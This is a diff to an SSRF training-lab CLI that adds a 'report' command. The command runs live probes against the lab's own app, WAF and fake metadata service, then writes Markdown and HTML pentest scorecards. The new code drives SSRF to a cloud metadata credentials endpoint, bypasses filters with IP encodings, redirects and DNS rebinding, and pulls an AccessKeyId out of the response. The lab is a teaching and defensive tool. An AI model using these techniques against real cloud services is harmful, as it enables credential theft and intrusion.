@@ -29,8 +29,10 @@ e.g. from the repo root with the lab running:
 from __future__ import annotations
 
 import argparse
+import datetime
 import html as htmllib
 import json
+import os
 import re
 import sys
 import time
@@ -232,6 +234,195 @@ def cmd_rebind(args):
     print("  once and pins the IP, so it cannot be rebound. Cf. CVE-2024-24759 (MindsDB).")
 
 
+def _report_gather(args):
+    """Run every check live and return the real data the report is built from."""
+    tests = payloads(args.metadata_ip)
+    matrix = {name: {lvl: probe(args.app, lvl, url) for lvl in (0, 1, 2, 3)}
+              for name, url in tests}
+    waf = {name: {"direct": probe(args.app, 0, url), "waf": probe(args.waf, 0, url)}
+           for name, url in tests}
+
+    v1_status, _b, v1_leaked = imds_check.probe_v1(args.metadata)
+    _toks, _tok, v2_get, v2_leaked = imds_check.probe_v2(args.metadata)
+
+    _get(f"{args.dns}/reset")
+    rb_target = f"http://{args.rebind_host}{CREDS_PATH}"
+    _s1, h1 = _get(_app_fetch_url(args.app, 25, rb_target))
+    rb_toctou = classify(h1) if h1 else "REQ-ERR"
+    _slog, rb_log = _get(f"{args.dns}/log")
+    _s2, h2 = _get(_app_fetch_url(args.app, 3, rb_target))
+    rb_l3 = classify(h2) if h2 else "REQ-ERR"
+
+    _sl, hl = _get(_app_fetch_url(args.app, 0, args.metadata + CREDS_PATH))
+    key_m = re.search(r'"AccessKeyId":\s*"([^"]+)"', _extract_pre(hl))
+
+    return {
+        "when": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
+        "matrix": matrix, "waf": waf,
+        "imds": {"v1_status": v1_status, "v1_leaked": v1_leaked,
+                 "v2_status": (v2_get[0] if v2_get else None), "v2_leaked": v2_leaked},
+        "rebind": {"toctou": rb_toctou, "l3": rb_l3,
+                   "log": [x for x in (rb_log or "").splitlines() if x.strip()]},
+        "loot_key": key_m.group(1) if key_m else "",
+    }
+
+
+def _report_findings(d):
+    m, waf, imds, rb = d["matrix"], d["waf"], d["imds"], d["rebind"]
+    f = []
+    if m.get("dotted-decimal", {}).get(0) == "LOOT":
+        f.append(("SSRF to cloud metadata → IAM credential theft", "Critical",
+                  "Actions on Objectives", "ATT&CK T1552.005 · CWE-918",
+                  f"At L0 a GET of the metadata credentials endpoint returned IAM "
+                  f"credentials (AccessKeyId={d['loot_key'] or 'ASIA…EXAMPLE'}).",
+                  "Resolve-then-pin the connected IP (L3); enforce IMDSv2; restrict "
+                  "egress; scope the instance role to least privilege."))
+    if m.get("decimal-integer", {}).get(1) == "LOOT":
+        f.append(("Blocklist bypass via alternate IP encodings", "High",
+                  "Delivery", "CWE-918",
+                  "At L1 the decimal/hex/octal IP forms bypassed the string blocklist → LOOT.",
+                  "Never blocklist URL strings; canonicalize and validate the resolved IP (L2/L3)."))
+    if m.get("dns-innocent", {}).get(2) == "LOOT" or m.get("302-redirect", {}).get(2) == "LOOT":
+        f.append(("Parser bypass via DNS name / 302 redirect", "High",
+                  "Delivery", "CWE-918",
+                  "At L2 an innocent-looking hostname and a 302 redirect reached the internal target → LOOT.",
+                  "Resolve-then-pin and re-validate every redirect hop (L3)."))
+    if rb["toctou"] == "LOOT" and rb["l3"] == "BLOCKED":
+        f.append(("DNS rebinding defeats check-then-use (TOCTOU)", "High",
+                  "Delivery", "ATT&CK T1552.005 · CWE-918",
+                  f"L2.5 (check-then-use) leaked creds via the TTL-0 flip ({' / '.join(rb['log'][:2])}); "
+                  "L3 resolve-then-pin BLOCKED the same request.",
+                  "Connect to the validated IP; never re-resolve the hostname at connect."))
+    if waf.get("dotted-decimal", {}).get("waf") == "WAF-403" and (
+            waf.get("dns-innocent", {}).get("waf") == "LOOT"
+            or waf.get("302-redirect", {}).get("waf") == "LOOT"):
+        f.append(("WAF bypass via hostname / redirect", "Medium",
+                  "Defense Evasion", "CWE-918",
+                  "The WAF (ModSecurity/CRS) 403s IP-literal payloads but passes a benign "
+                  "hostname/redirect, which still reaches the metadata endpoint — the Capital One pattern.",
+                  "Treat the WAF as one layer only; fix at the application (L3) and platform (IMDSv2)."))
+    if imds["v1_leaked"]:
+        f.append(("IMDSv1 enabled (metadata needs no token)", "High",
+                  "Credential Access", "ATT&CK T1552.005",
+                  "A plain GET to the metadata credentials endpoint succeeds without a token.",
+                  "Enforce IMDSv2 (HttpTokens=required); audit with ec2-imdsv2-check."))
+    return f
+
+
+def _report_positives(d):
+    m, imds, rb = d["matrix"], d["imds"], d["rebind"]
+    pos = []
+    if all(m.get(k, {}).get(3) == "BLOCKED" for k in ("dotted-decimal", "decimal-integer", "dns-innocent", "302-redirect")):
+        pos.append("L3 (resolve-then-pin + redirect revalidation) blocked every internal payload.")
+    if rb["l3"] == "BLOCKED":
+        pos.append("L3 blocked the DNS-rebinding attack that defeated the check-then-use level.")
+    if (not imds["v1_leaked"]) and imds["v2_leaked"]:
+        pos.append("IMDSv2 denied the bare-GET SSRF (401); only the PUT-token flow worked.")
+    return pos
+
+
+def _render_md(d):
+    f = _report_findings(d)
+    pos = _report_positives(d)
+    L = ["# SSRF Lab — Penetration Test Scorecard", "",
+         f"_Generated {d['when']} · **LAB-ONLY — all credentials are fake, no real system was tested.**_", "",
+         "## Executive summary", "",
+         f"A controlled SSRF lab was assessed end-to-end. **{len(f)} findings** were "
+         "confirmed with live evidence. Without application-layer validation the server "
+         "can be driven to the cloud metadata endpoint and leak IAM credentials; naive "
+         "filters and a WAF were each bypassed. The attack was stopped only by correct "
+         "app logic (resolve-then-pin) and platform hardening (IMDSv2).", "",
+         "## Findings", "",
+         "| # | Finding | Severity | Kill chain | Mapping |",
+         "|---|---------|----------|-----------|---------|"]
+    for i, (title, sev, kc, mp, _ev, _rem) in enumerate(f, 1):
+        L.append(f"| {i} | {title} | {sev} | {kc} | {mp} |")
+    L += ["", "### Detail & remediation", ""]
+    for i, (title, sev, _kc, _mp, ev, rem) in enumerate(f, 1):
+        L += [f"**{i}. {title}** — _{sev}_", "", f"- Evidence: {ev}", f"- Remediation: {rem}", ""]
+    L += ["## Defenses verified effective", ""]
+    L += [f"- ✅ {p}" for p in pos] or ["- (none)"]
+    L += ["", "## Scorecard — defense level vs payload (live)", "",
+          "| payload | L0 | L1 | L2 | L3 | via-WAF |",
+          "|---------|----|----|----|----|---------|"]
+    for name in d["matrix"]:
+        c = d["matrix"][name]
+        L.append(f"| {name} | {c[0]} | {c[1]} | {c[2]} | {c[3]} | {d['waf'][name]['waf']} |")
+    L += ["", f"IMDS: v1 GET status {d['imds']['v1_status']} (creds leaked: {d['imds']['v1_leaked']}).",
+          "", "_LOOT = credentials stolen · BLOCKED = app filter · WAF-403 = WAF refused._"]
+    return "\n".join(L)
+
+
+def _render_html(d):
+    f = _report_findings(d)
+    pos = _report_positives(d)
+    sevc = {"Critical": "#f87171", "High": "#fb923c", "Medium": "#fbbf24", "Low": "#38bdf8"}
+    vc = {"LOOT": "#f87171", "BLOCKED": "#34d399", "WAF-403": "#34d399",
+          "FETCHED": "#38bdf8", "ERROR": "#8da2bd", "REQ-ERR": "#8da2bd"}
+
+    def badge(sev):
+        return f'<span style="background:{sevc.get(sev,"#888")};color:#07121f;font-weight:700;padding:2px 8px;border-radius:999px;font-size:12px">{sev}</span>'
+
+    rows = "".join(
+        f'<tr><td>{i}</td><td>{htmllib.escape(t)}</td><td>{badge(s)}</td><td>{kc}</td><td>{mp}</td></tr>'
+        for i, (t, s, kc, mp, _e, _r) in enumerate(f, 1))
+    detail = "".join(
+        f'<div class="fd"><h4>{i}. {htmllib.escape(t)} {badge(s)}</h4>'
+        f'<p><b>Evidence:</b> {htmllib.escape(e)}</p><p><b>Remediation:</b> {htmllib.escape(r)}</p></div>'
+        for i, (t, s, _kc, _mp, e, r) in enumerate(f, 1))
+    posli = "".join(f"<li>✅ {htmllib.escape(p)}</li>" for p in pos) or "<li>(none)</li>"
+
+    def vcell(v):
+        return f'<td style="background:{vc.get(v,"#333")}22;color:{vc.get(v,"#ccc")};font-weight:700">{v}</td>'
+    score = "".join(
+        f'<tr><td class="pl">{n}</td>' + "".join(vcell(d["matrix"][n][l]) for l in (0, 1, 2, 3))
+        + vcell(d["waf"][n]["waf"]) + "</tr>" for n in d["matrix"])
+
+    return f"""<!doctype html><html><head><meta charset="utf-8">
+<title>SSRF Lab — Pentest Scorecard</title><style>
+body{{background:#0a0f1a;color:#dbe4f0;font-family:"Segoe UI",system-ui,sans-serif;max-width:900px;margin:auto;padding:28px}}
+h1{{margin:0}}.badge{{background:#fbbf24;color:#0a0f1a;font-weight:700;font-size:11px;padding:4px 10px;border-radius:999px}}
+h2{{border-bottom:1px solid #243147;padding-bottom:6px;margin-top:28px}}
+table{{border-collapse:collapse;width:100%;font-size:13px;margin-top:8px}}
+th,td{{border:1px solid #243147;padding:6px 9px;text-align:center}}th{{color:#8da2bd}}.pl{{text-align:left}}
+.fd{{background:#111a2b;border:1px solid #243147;border-radius:10px;padding:12px 14px;margin:10px 0}}
+.fd h4{{margin:0 0 6px}} .muted{{color:#8da2bd}}
+</style></head><body>
+<span class="badge">⚠ LAB-ONLY · all credentials are fake · no real system tested</span>
+<h1>🛡️ SSRF Lab — Penetration Test Scorecard</h1>
+<p class="muted">Generated {d['when']} · evidence from live runs against the lab's own services.</p>
+<h2>Executive summary</h2>
+<p>{len(f)} findings were confirmed with live evidence. Without application-layer
+validation the server reaches the cloud metadata endpoint and leaks IAM credentials;
+naive filters and the WAF were each bypassed. The attack was stopped only by correct
+app logic (resolve-then-pin, L3) and platform hardening (IMDSv2).</p>
+<h2>Findings</h2>
+<table><tr><th>#</th><th>Finding</th><th>Severity</th><th>Kill chain</th><th>Mapping</th></tr>{rows}</table>
+<h2>Detail &amp; remediation</h2>{detail}
+<h2>Defenses verified effective</h2><ul>{posli}</ul>
+<h2>Scorecard — defense level vs payload (live)</h2>
+<table><tr><th class="pl">payload</th><th>L0</th><th>L1</th><th>L2</th><th>L3</th><th>via-WAF</th></tr>{score}</table>
+<p class="muted">IMDS: v1 GET status {d['imds']['v1_status']} (creds leaked: {d['imds']['v1_leaked']}).
+LOOT = credentials stolen · BLOCKED = app filter · WAF-403 = WAF refused.</p>
+</body></html>"""
+
+
+def cmd_report(args):
+    _stage("REPORT", "generate a pentest scorecard from live lab data")
+    data = _report_gather(args)
+    os.makedirs(args.out, exist_ok=True)
+    md_path = os.path.join(args.out, "report.md")
+    html_path = os.path.join(args.out, "report.html")
+    with open(md_path, "w", encoding="utf-8") as fh:
+        fh.write(_render_md(data))
+    with open(html_path, "w", encoding="utf-8") as fh:
+        fh.write(_render_html(data))
+    n = len(_report_findings(data))
+    print(_c(f"  [+] Report written: {n} findings", "1;32"))
+    print(f"      {md_path}")
+    print(f"      {html_path}")
+
+
 def cmd_full(args):
     print(_c("\n  SSRFKIT — full kill-chain demo (LAB-ONLY)", "1;35"))
     print("  Reconnaissance -> Weaponization -> Exploitation -> Actions on Objectives")
@@ -260,6 +451,7 @@ def build_parser():
     common.add_argument("--metadata-ip", default=DEFAULTS["metadata_ip"], help="metadata IP")
     common.add_argument("--dns", default=DEFAULTS["dns"], help="rebinding DNS control API URL")
     common.add_argument("--rebind-host", default=DEFAULTS["rebind_host"], help="rebinding hostname")
+    common.add_argument("--out", default="reports", help="output dir for 'report'")
     common.add_argument("--level", type=int, default=0, choices=[0, 1, 2, 3],
                         help="defense level to use (default 0)")
     common.add_argument("--no-color", action="store_true", help="disable coloured output")
@@ -272,6 +464,7 @@ def build_parser():
         ("loot", cmd_loot, "exfiltrate the fake IAM credentials"),
         ("audit", cmd_audit, "check IMDSv1 vs IMDSv2 enforcement"),
         ("rebind", cmd_rebind, "DNS rebinding: TOCTOU bypass (L2.5) vs L3"),
+        ("report", cmd_report, "generate a pentest scorecard (HTML + Markdown)"),
         ("full", cmd_full, "run the full kill-chain demo"),
     ]:
         sp = sub.add_parser(name, parents=[common], help=help_text)
